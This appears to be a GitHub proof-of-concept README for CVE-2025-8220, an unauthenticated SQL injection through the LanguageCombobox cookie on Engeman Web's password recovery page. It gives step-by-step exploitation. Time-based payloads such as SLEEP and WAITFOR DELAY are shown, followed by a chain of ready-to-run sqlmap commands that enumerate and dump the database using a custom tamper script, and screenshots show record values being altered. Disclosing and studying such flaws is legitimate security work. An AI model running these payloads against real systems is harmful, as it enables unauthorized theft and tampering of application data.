# Engeman Web <= 12.0.0.1 Password Recovery Page Load Unauthenticated SQL Injection

Proof of concept for exploitation of the vulnerability described in **CVE-2025-8220,** which concerns the possibility of **SQL Injection** during the password recovery page load in the **Engeman Web** software.

## Description

A vulnerability that allows manipulation of the **SQL** query made during the password recovery page load was found in the **Engeman Web** software. This vulnerability can be exploited by visitors without access to any valid credentials, that is, in an unauthenticated manner, to compromise the confidentiality and integrity of the data stored in the application's database, as well as potentially cause denial of service at the component level by altering values in critical tables.

## Vendor Website

https://engeman.com/en/

## Exploitation

After accessing the application and being redirected to the login page, click the button to be redirected to the password recovery page.

![Engeman Web initial page](https://github.com/user-attachments/assets/7aa5bc05-dabb-4f08-8511-efecf0794609 "Engeman Web initial page")

![Engeman Web password recovery page](https://github.com/user-attachments/assets/4e9dd7b8-220d-45c7-b5b7-fe739c2e14f9 "Engeman Web password recovery page")

Check the request made by the browser to load the password recovery page. You will notice that some cookies are present, including the **LanguageCombobox** cookie, which is stored during the initial access. The **Burp Suite** software was used in this demonstration to view and resend browser requests more efficiently.

![Request made to get the content of the password recovery page](https://github.com/user-attachments/assets/fa7be811-d500-4a63-b30f-dca46134acf6 "Request made to get the content of the password recovery page")

To confirm the vulnerability, insert a single quotation mark as the value of the mentioned cookie and resend the request. An error indicating an unclosed quotation mark should be displayed in the application's response.

![Forcing an error in the application through a single quotation in the value of the LanguageCombobox cookie](https://github.com/user-attachments/assets/48f4db9f-dd41-4209-8180-e0476a15dff8 "Forcing an error in the application through a single quotation in the value of the LanguageCombobox cookie")

The query results are not displayed directly on the returned page, making this a blind exploitation. You can insert payloads such as **' AND SLEEP(30)-- -** or **'; WAITFOR DELAY '0:0:30'--** to infer the underlying database.

![Inferring the underlying database type through a time-based payload](https://github.com/user-attachments/assets/260ac765-816f-4ba7-afa7-5cb32a2e60f0 "Inferring the underlying database type through a time-based payload")

Once the injection is confirmed, an automated tool such as **sqlmap** can be used to dump the database.

It is important to note that the **--technique** argument must include the value **SEB** so that techniques based on **stacked queries, errors,** and **boolean** comparisons are used. First, because a blind exploitation is necessary, and second, because omitting the **S** option from the argument value resulted in **sqlmap** being unable to find the injection point in **SQL Server** databases.

```bash
sqlmap -u https://<target>/Login/RecoveryPass --cookie 'LanguageCombobox=*' --level 5 --risk 3 --technique=SEB --batch
```

![Using sqlmap to test the injection point](https://github.com/user-attachments/assets/9a877f7a-ad27-4b6d-aec5-2a329dad9809 "Using sqlmap to test the injection point")

Different possible exploitation techniques will be identified through the injection point. After that, the database information can be retrieved.

```bash
sqlmap -u https://<target>/Login/RecoveryPass --cookie 'LanguageCombobox=*' --level 5 --risk 3 --technique=SEB --batch --dbs
```

![Getting available databases through sqlmap](https://github.com/user-attachments/assets/86c3e9a6-3dc7-4e20-a7d0-3802dad7078f "Getting available databases through sqlmap")

```bash
sqlmap -u https://<target>/Login/RecoveryPass --cookie 'LanguageCombobox=*' --level 5 --risk 3 --technique=SEB --batch -D Engeman --tables
```

![Getting available tables through sqlmap](https://github.com/user-attachments/assets/b07c0ace-3618-469f-abb5-9b02da887947 "Getting available tables through sqlmap")

```bash
sqlmap -u https://<target>/Login/RecoveryPass --cookie 'LanguageCombobox=*' --level 5 --risk 3 --technique=SEB --batch -D Engeman -T <table> --columns
```

![Getting available columns thorugh sqlmap](https://github.com/user-attachments/assets/8b401cfc-ffae-4d8f-889f-687462c44af9 "Getting available columns thorugh sqlmap")

To dump table records using **sqlmap,** it is necessary to use a custom tamper script — at least for **SQL Server** databases — which goes by the name **replace-dbo.py** in this repository. The reason for this is that **sqlmap** payloads using the format **\<database\>.dbo.\<table\>** to reference the table object conflict with the application's processing. The mentioned tamper converts it to the format **\<database\>.\<table\>** only. If the instance of **Engeman Web** uses **MySQL** or another database this tamper will not be required, or another one will need to be created.

![Trying a payload with the format <database>.dbo.<table> to reference the table object](https://github.com/user-attachments/assets/ba46cc47-335b-45ec-bd8a-a96060e59e1b "Trying a payload with the format <database>.dbo.<table> to reference the table object")

![Trying the same payload but now with the format <database>.<table> to reference the table object](https://github.com/user-attachments/assets/d7186184-a122-4170-90d1-1bef3b3f7f0e "Trying the same payload but now with the format <database>.<table> to reference the table object")

Remember that the sqlmap tool requires an empty file named **__init__.py** to exist in the directory where the tamper script is located in order for it to be used, if you don't placed it on the default tamper directory for your installation.

```bash
sqlmap -u https://<target>/Login/RecoveryPass --cookie 'LanguageCombobox=*' --level 5 --risk 3 --technique=SEB --batch -D Engeman -T <table> --dump --tamper <tamper-file>.py
```

![Retrieving application's general configurations](https://github.com/user-attachments/assets/3e90f8ea-2364-4e5e-9420-9cef1a5c7369 "Retrieving application's general configurations")

This tamper will cause conflicts if used at any stage of the process other than during the dump of a specific table. Therefore, do not use it to obtain the databases **(--dbs),** tables **(--tables),** columns **(--columns),** or additional information such as the database user **(--current-user).**

Since the user used by the application to interact with the database has high privileges within the context of system records, it is also possible to manipulate the underlying query to alter the values of the table records (this is much easier if the instance is using **SQL Server** as the underlying database).

![JWTVALIDOTOKEN column of CFGGERAL table unique entry initial value](https://github.com/user-attachments/assets/6dac2008-1b21-4695-a9a1-b238a86600f2 "JWTVALIDOTOKEN table initial value")

![Modifying the JWTVALIDOTOKEN entry column value](https://github.com/user-attachments/assets/b850f6c6-84a6-4d2f-aa12-f9e046931695 "Modifying the JWTVALIDOTOKEN entry column value")

![JWTVALIDOTOKEN column of CFGGERAL table unique entry modified value](https://github.com/user-attachments/assets/9e1a59cf-c627-4a2e-996e-ad6140fb4bf8 "JWTVALIDOTOKEN column of CFGGERAL table unique entry modified value")

## Impact

Through this vulnerability, any instance of the system would be susceptible to the unauthorized retrieval and possibly modification of data present in the database in use.

This vulnerability was confirmed in versions up to **12.0.0.1,** but a more recent version is likely also vulnerable.
